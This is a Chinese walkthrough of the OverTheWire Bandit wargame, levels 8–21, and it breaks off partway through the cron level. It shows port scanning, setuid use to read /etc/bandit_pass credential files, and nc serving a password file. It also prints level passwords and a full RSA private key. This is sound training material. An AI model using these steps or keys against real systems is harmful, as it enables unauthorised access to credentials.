描述：下一级别的密码存储在文件data.txt中， 并且是仅出现一次的唯一文本行 过程： 1234bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUh sort命令用于将文本文件内容加以排序，可针对文本文件的内容，以行为单位来排序。”uniq -u”是上下相邻两行对比得到是否为单一行。 密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level 9→ Level 10用账号：bandit9，密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR进入本关 描述：下一级别的密码存储在文件data.txt 中的少数人类可读字符串之一中，以几个’=’字符开始。 过程： 1234567bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ strings data.txt | grep ============ theP`========== passwordL========== isA========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk strings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束，用 grep 命令筛选 含有”==”的字符串。 密码：truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level 10→ Level 11用账号：bandit10，密码：truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk进入本关 描述：下一级的密码存储在包含base64编码数据的文件data.txt中 过程： 123456bandit10@bandit:~$ lsdata.txtbandit10@bandit:~$ cat data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==bandit10@bandit:~$ base64 -d data.txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR base64 编码了数据，解码就好了 密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level 11→ Level 12用账号：bandit11，密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR进入本关 描述：下一级的密码存储在文件data.txt中，其中所有小写（az）和大写（AZ）字母已被旋转了13个位置 过程： 123456bandit11@bandit:~$ lsdata.txtbandit11@bandit:~$ cat data.txt Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHhbandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu tr 命令，参数为两个字符集，把第一个字符集中的字符替换为第二个字符集中的对应字符。题目中说旋转了13个位置，相当于26个字母前十三个和后十三个换了个位置。按照这样的对应关系，调整给出的字符集。 密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level 12→ Level 13用账号：bandit12，密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu进入本关 描述：下一级的密码存储在data.txt文件中，该文件是一个经过反复压缩的文件的十六进制转储文件。对于这个级别，可以在/ tmp下创建一个可以使用mkdir工作的目录。例如：mkdir / tmp / myname123。然后使用cp复制数据文件，并使用mv重命名它。 过程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990bandit12@bandit:~$ lsdata.txtbandit12@bandit:~$ mkdir /tmp/Crayon123; cp data.txt /tmp/Crayon123/data_1; cd /tmp/Crayon123bandit12@bandit:/tmp/Crayon123$ cat data_1 ;file data_1 00000000: 1f8b 0808 ecf2 445a 0203 6461 7461 322e ......DZ..data2.00000010: 6269 6e00 0149 02b6 fd42 5a68 3931 4159 bin..I...BZh91AY00000020: 2653 5930 3e1b 4000 0014 ffff dde3 2b6d &amp;SY0&gt;.@.......+m00000030: afff dd1e dfd7 ffbf bdfb 3f67 bfff ffff ..........?g....00000040: bde5 bfff aff7 bfdb e5ff ffef b001 39b0 ..............9.00000050: 480d 3400 0068 0068 1a00 0000 01a3 4000 H.4..h.h......@.00000060: 0001 a643 4d34 0000 d00d 0698 800d 1934 ...CM4.........400000070: d0c4 d034 1a36 a343 646a 1c9a 3206 9a00 ...4.6.Cdj..2...00000080: 3406 8000 068d 064f 51a3 4000 000f 5000 4......OQ.@...P.00000090: 6868 0034 d308 0da4 6990 1a03 4000 6869 hh.4....i...@.hi000000a0: a0d0 00d3 2341 94d0 0006 8006 8034 1a34 ....#A.......4.4000000b0: 00d0 d000 0310 d068 3400 001e 900d 1a19 .......h4.......000000c0: 0062 68d3 4680 640f 48d0 d320 0068 621a .bh.F.d.H.. .hb.000000d0: 0543 0116 180c 6232 a7d7 82c8 7bd4 2374 .C....b2....&#123;.#t000000e0: 1de5 e375 b7b9 0b78 2d37 bd61 5cdf 40da ...u...x-7.a\.@.000000f0: b8e5 3258 213d e4bb ecb2 8d51 84f9 3bd0 ..2X!=.....Q..;.00000100: b1c9 ef2a bcff 45cc 1f1c 0028 1cfe 8784 ...*..E....(....00000110: 78a9 7611 0a81 c4d5 cb26 4b80 7888 c9bc x.v......&amp;K.x...00000120: 2b3e a351 59ae c1fd 36c8 286e d6c3 bb2b +&gt;.QY...6.(n...+00000130: b280 d19b 70b3 190a 0204 4603 9f79 e2b8 ....p.....F..y..00000140: cf1b 8330 fcad 3780 86c2 5c3d 5bc9 4631 ...0..7...\=[.F100000150: 3718 5e2e a88c 34e6 8461 35ad c14f 6fd4 7.^...4..a5..Oo.00000160: 31dd a5cc 5223 545e e01d ff23 cde3 22cc 1...R#T^...#..".00000170: 22fa a62b e27a dfa5 d4f0 c326 28ef a4b3 "..+.z.....&amp;(...00000180: adc5 149c 1c27 dbc4 97b9 6342 487e bfe3 .....'....cBH~..00000190: 02ee d63e 3379 8ebc d559 c670 7987 da1d ...&gt;3y...Y.py...000001a0: 4c4b 5ec4 9965 075b 9d0b 08ee df17 d07c LK^..e.[.......|000001b0: ea9a 5fbf 43e7 d405 5239 1437 0c8a 34cd .._.C...R9.7..4.000001c0: be6f a949 b061 68e8 6ba5 c9ba 4112 0819 .o.I.ah.k...A...000001d0: 7cb9 a3c8 bff1 0895 1819 8f80 407e dc32 |...........@~.2000001e0: 9269 ca68 3f58 bb30 cd9b fcd6 0006 1224 .i.h?X.0.......$000001f0: 177b fe66 c676 01f0 a5bc 9131 6746 cc85 .&#123;.f.v.....1gF..00000200: 1a39 e46f 6b9a 7bd4 694b e999 c300 b57e .9.ok.&#123;.iK.....~00000210: 9b0a 1229 fac1 cc0c 24fb a905 a06a b8cf ...)....$....j..00000220: cb56 2a73 6016 6950 8208 5785 af54 0d42 .V*s`.iP..W..T.B00000230: 754e 5a48 8835 2b47 aa9b c45e 4ca8 a7a0 uNZH.5+G...^L...00000240: 61dd e070 7717 9346 5f14 d808 8263 7746 a..pw..F_....cwF00000250: 5100 3af8 fa20 ff8b b922 9c28 4818 1f0d Q.:.. ...".(H...00000260: a000 e793 1e61 4902 0000 .....aI...data_1: ASCII textbandit12@bandit:/tmp/Crayon123$ xxd -r data_1 &gt; data_2 ; file data_2data_2: gzip compressed data, was "data2.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data_2 data_3.gz ;bandit12@bandit:/tmp/Crayon123$ gzip -d data_3.gz ;bandit12@bandit:/tmp/Crayon123$ lsdata_1 data_3bandit12@bandit:/tmp/Crayon123$ file data_3data_3: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/Crayon123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ;bandit12@bandit:/tmp/Crayon123$ lsdata_1 data_4bandit12@bandit:/tmp/Crayon123$ file data_4data_4: gzip compressed data, was "data4.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data_4 data_5.gz ; gzip -d data_5.gz bandit12@bandit:/tmp/Crayon123$ lsdata_1 data_5bandit12@bandit:/tmp/Crayon123$ file data_5data_5: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data_5 data_6.tar ; tar -xvf data_6.tardata5.binbandit12@bandit:/tmp/Crayon123$ lsdata5.bin data_1 data_6.tarbandit12@bandit:/tmp/Crayon123$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data5.bin data_7.tar; tar -xvf data_7.tardata6.binbandit12@bandit:/tmp/Crayon123$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/Crayon123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2bandit12@bandit:/tmp/Crayon123$ lsdata_1 data_6.tar data_7.tar data_8bandit12@bandit:/tmp/Crayon123$ file data_8data_8: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data_8 data_9.tar ; tar -xvf data_9.tardata8.binbandit12@bandit:/tmp/Crayon123$ lsdata8.bin data_1 data_6.tar data_7.tar data_9.tarbandit12@bandit:/tmp/Crayon123$ file data8.bin data8.bin: gzip compressed data, was "data9.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data8.bin data_10.gz ; gzip -d data_10.gzbandit12@bandit:/tmp/Crayon123$ lsdata_1 data_10 data_6.tar data_7.tar data_9.tarbandit12@bandit:/tmp/Crayon123$ file data_10data_10: ASCII textbandit12@bandit:/tmp/Crayon123$ cat data_10The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL 其实这一题并不是很难，一步一步看解题过程就明白怎么回事了，文件最开始是16进制，用” xxd -r”将16进制文件转换为二进制文件，然后每一步都查看一次文件类型，并重命名为相应的文件类型，主要运用”bzip2 -d”,”gzip -d”,”tar -xvf”以及`这些解压方法。 密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level 13→ Level 14用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关 描述：下一级的密码存储在 / etc / bandit_pass / bandit14中，只能由用户bandit14读取。对于这个级别，你不会得到下一个密码，但你得到一个私人SSH密钥，可以用来登录到下一个级别。 注意： localhost是指您正在使用的机器的主机名 过程： 1234567891011121314bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostCould not create directory '/home/bandit13/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargames 。。。。。。bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e 通过ssh命令，通过sshkey.private密钥连接进去，这里连接时不用指定端口（亲测），然后已经告诉你密码存在的位置，用cat查看 密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level 14→ Level 15用账号：bandit14，密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e进入本关 描述：可以通过将当前级别的密码提交到本地主机上的端口30000来检索下一级别的密码。 过程： 1234bandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr 直接通过nc连接本地的30000端口，输入当前级别的密码后返回下一级密码。 密码：BfMYroe26WYalil77FoDi9qh59eK5xNr Level 15→ Level 16用账号：bandit15，密码：BfMYroe26WYalil77FoDi9qh59eK5xNr进入本关 描述：可以通过使用SSL加密将当前级别的密码提交到本地主机上的端口30001来检索下一级别的密码。 过程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof CONNECTED(00000003)depth=0 CN = banditverify error:num=18:self signed certificateverify return:1depth=0 CN = banditverify return:1---Certificate chain 0 s:/CN=bandit i:/CN=bandit---Server certificate-----BEGIN CERTIFICATE-----MIICsjCCAZqgAwIBAgIJAKZI1xYeoXFuMA0GCSqGSIb3DQEBCwUAMBExDzANBgNVBAMMBmJhbmRpdDAeFw0xNzEyMjgxMzIzNDBaFw0yNzEyMjYxMzIzNDBaMBExDzANBgNVBAMMBmJhbmRpdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcXruVcnQUBeHJeNpSYayQExCJmcHzSCktnOnF/H4efWzxvLRWt5z4gYaKvTC9ixLrbK7a255GEaUbP/NVFpB/sn56uJc1ijz8u0hWQ3DwVe5ZrHUkNzAuvC2OeQgh2HanV5LwB1nmRZn90PG1puKxktMjXsGY7f9Yvx1/yVnZqu2Ev2uDA0RXij/T+hEqgDMI7y4ZFmuYD8z4b2kAUwj7RHh9LUKXKQlO+Pn8hchdR/4IK+Xc4+GFOin0XdQdUJaBD8quOUma424ejF5aB6QCSE82MmHlLBO2tzC9yKv8L8w+fUeQFECH1WfPC56GcAq3UIvgdjGrU/7EKN5XkONcCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsFAAOCAQEAnrOty7WAOpDGhuu0V8FqPoKNwFrqGuQCTeqhQ9LP0bFNhuH34pZ0JFsHL+Y/q4Um7+66mNJUFpMDykm51xLY2Y4oDNCzugy+fm5Q0EWKRwrq+hIM+5hs0RdCnARP+719ddmUiXF7r7IVP2gK+xqpa8+YcYnLuoXEtpKkrrQCCUiqabltU5yRMR773wqB54txrB4IhwnXqpO23kTuRNrkG+JqDUkaVpvct+FAdT3PODMONP/oHII3SH9iar/rI9k+4hjlg4NqOoduxX9M+iLJ0Zgj6HAg3EQVn4NHsgmuTgmknbhqTU3o4IwBXFnxdxVy0ImGYtvmnZDQCGivDok6jA==-----END CERTIFICATE-----subject=/CN=banditissuer=/CN=bandit---No client certificate CA names sent---SSL handshake has read 1015 bytes and written 631 bytes---New, TLSv1/SSLv3, Cipher is AES128-SHAServer public key is 2048 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONENo ALPN negotiatedSSL-Session: Protocol : TLSv1 Cipher : AES128-SHA Session-ID: 741E8F2AA4126571FCD3FD72409056D6C2BB4EBA4C96DAA7ECB1B923E0AA2142 Session-ID-ctx: Master-Key: E404B34CD36A55A4AC779E1BEBBE03E160F4783C9DF59D9FE92D1E5F4287915E842262DBAF35246171BBF637330DDD6F Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 08 f0 15 a5 d6 6f a0 e8-06 d6 bb a4 0c 33 eb 04 .....o.......3.. 0010 - bd 56 71 6b cb 4c fc f2-93 20 36 8b 57 85 3e 88 .Vqk.L... 6.W.&gt;. 0020 - 26 35 ed d8 9d 5b 54 30-40 78 df 5d ef 0e 2b c1 &amp;5...[T0@x.]..+. 0030 - c4 c8 55 4c 8f bf 7f 5d-4b 7c 14 6b 07 34 35 1d ..UL...]K|.k.45. 0040 - 62 8d 9d 8b 37 c6 be 1a-0c 81 59 13 68 e4 7a 4c b...7.....Y.h.zL 0050 - 20 e4 8c 1a 27 0c 0d a5-dd 5b 70 5b 27 76 e2 99 ...'....[p['v.. 0060 - 58 3a dc e5 18 57 98 0b-e3 2f c3 4c c6 0f 97 2d X:...W.../.L...- 0070 - d6 7f 84 47 8b 88 17 b3-ec 27 b8 33 3e 1e 27 dd ...G.....'.3&gt;.'. 0080 - 54 0d 24 63 18 f7 4c 5d-4e bf 06 2d 7c fb a1 a0 T.$c..L]N..-|... 0090 - f0 78 d9 33 06 5d bb a7-bb 7e ff 66 7e 4f 77 4b .x.3.]...~.f~OwK Start Time: 1524472977 Timeout : 300 (sec) Verify return code: 18 (self signed certificate)---BfMYroe26WYalil77FoDi9qh59eK5xNrCorrect!cluFn7wTiGryunymYOu4RcffSxQluehdclosed 使用openssl命令连接成功后复制上本关的密码回车即可获得下一关的密码。 密码：cluFn7wTiGryunymYOu4RcffSxQluehd Level 16→ Level 17用账号：bandit16，密码：cluFn7wTiGryunymYOu4RcffSxQluehd进入本关 描述：可以通过将当前级别的密码提交给本地主机上的端口（范围在31000到32000）来检索下一级的凭证。首先找出哪些端口有一个服务器监听它们。然后找出哪些人说SSL和哪些不。只有一台服务器可以提供下一个凭证，其他人只需发送给您即可发送给它。 过程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108bandit16@bandit:~$ nmap -p 31000-32000 localhostStarting Nmap 7.01 ( https://nmap.org ) at 2018-04-23 11:17 CESTNmap scan report for localhost (127.0.0.1)Host is up (0.00019s latency).Other addresses for localhost (not scanned): ::1Not shown: 996 closed portsPORT STATE SERVICE31046/tcp open unknown31518/tcp open unknown31691/tcp open unknown31790/tcp open unknown31960/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 0.07 secondsbandit16@bandit:~$ echo "Hello World!" | nc localhost 31046Hello World!bandit16@bandit:~$ echo "Hello World!" | nc localhost 31518bandit16@bandit:~$ echo "Hello World!" | nc localhost 31691Hello World!bandit16@bandit:~$ echo "Hello World!" | nc localhost 31790bandit16@bandit:~$ echo "Hello World!" | nc localhost 31960Hello World!bandit16@bandit:~$ echo "Hello World" | openssl s_client -quiet -connect localhost:31518depth=0 CN = banditverify error:num=18:self signed certificateverify return:1depth=0 CN = banditverify return:1Hello World^Cbandit16@bandit:~$ openssl s_client -quiet -connect localhost:31790depth=0 CN = banditverify error:num=18:self signed certificateverify return:1depth=0 CN = banditverify return:1cluFn7wTiGryunymYOu4RcffSxQluehdCorrect!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----bandit16@bandit:~$ mkdir /tmp/crayonxin bandit16@bandit:~$ cd /tmp/crayonxinbandit16@bandit:/tmp/crayonxin$ echo "-----BEGIN RSA PRIVATE KEY----- &gt; MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ&gt; imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ&gt; Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu&gt; DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW&gt; JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX&gt; x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD&gt; KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl&gt; J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd&gt; d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC&gt; YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A&gt; vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama&gt; +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT&gt; 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx&gt; SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd&gt; HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt&gt; SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A&gt; R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi&gt; Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg&gt; R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu&gt; L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni&gt; blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU&gt; YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM&gt; 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b&gt; dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3&gt; vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=&gt; -----END RSA PRIVATE KEY-----" &gt; ssh.privatebandit16@bandit:/tmp/crayonxin$ chmod 600 ssh.privatebandit16@bandit:/tmp/crayonxin$ ssh -i ssh.private bandit17@localhostCould not create directory '/home/bandit16/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit16/.ssh/known_hosts).。。。。。。bandit17@bandit:~$ lspasswords.new passwords.old 后来才知道密码位于/etc/bandit_pass/bandit17 密码：xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn Level 17→ Level 18此题接着上一题的shell 描述：homedirectory中有2个文件：passwords.old和passwords.new。下一级别的密码位于 passwords.new中，是密码.old和passwords.new之间已更改的唯一行。 过程： 1234567bandit17@bandit:~$ lspasswords.new passwords.oldbandit17@bandit:~$ diff passwords.old passwords.new42c42&lt; 6vcSC74ROI95NqkKaeEC2ABVMDX9TyUr---&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd 密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Level 18→ Level 19用账号：bandit18，密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd进入本关 描述：下一级别的密码存储在家庭目录中的文件自述文件中。不幸的是， 当你使用SSH登录时，有人修改了.bashrc将你注销。 过程： 1234 Enjoy your stay!Byebye !Connection closing...Socket close. 刚刚连进去就断开了 123456789101112131415bandit17@bandit:~$ ssh bandit18@localhost cat readmeThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit17/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargames@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for '/home/bandit17/.ssh/id_rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key "/home/bandit17/.ssh/id_rsa": bad permissionsbandit18@localhost's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x 在进行ssh连接的时候就把参数带进去，在password: 后粘贴本关的密码后，就返回了下一关的密码。 密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Level 19→ Level 20用账号：bandit19，密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x进入本关 描述：要访问下一级，您应该使用homeu目录中的setuid二进制文件。执行它没有参数找出如何使用它。使用setuid二进制文件后，可以在通常的地方（/ etc / bandit_pass）找到该级别的密码。 大致意思就是告诉你 Home 目录下有个文件，先不带参数执行一下，他会告诉你怎么用。 过程： 12345678910111213bandit19@bandit:~$ ls bandit20-dobandit19@bandit:~$ ls -l bandit20-do -rwsr-x--- 1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-dobandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ ./bandit20-do whoamibandit20bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j 一步一步就知道这个文件的作用以及用法 密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level 20→ Level 21用账号：bandit20，密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j进入本关 描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它在您指定为命令行参数的端口上连接到localhost。然后它从连接中读取一行文本，并将其与前一级别的密码（bandit20）进行比较。如果密码正确，它将传输下一级密码（bandit21）。 注意：尝试连接到您自己的网络守护程序，以查看它是否按照您的想法工作，这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。 过程： 首先使用nc 监听一个端口，并推送/etc/bandit_pass/bandit20文件内容，即bandit20的密码 123456bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20 此时2333端口处于监听状态，再建立一个ssh连接 12345bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect 2333Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0jPassword matches, sending next password 成功读取到文件以后，就把下一关的密码发送到监听端口 1234567bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr 成功获得密码 。 密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Level 21→ Level 22用账号：bandit21，密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr进入本关 描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。 过程： 12345678910111213141516171819bandit21@bandit:~$ cd /etc/cron.d/bandit21@bandit:/etc/cron.d$ ls -altotal 28drwxr-xr-x 2 root root 4096 Dec 28 14:34 .drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..-rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder-rw-r--r-- 1 root root 120 Dec 28 14:34 cronjob_bandit22-rw-r--r-- 1 root root 122 Dec 28 14:34 cronjob_bandit23-rw-r--r-- 1 root root 120 Dec 28 14:34 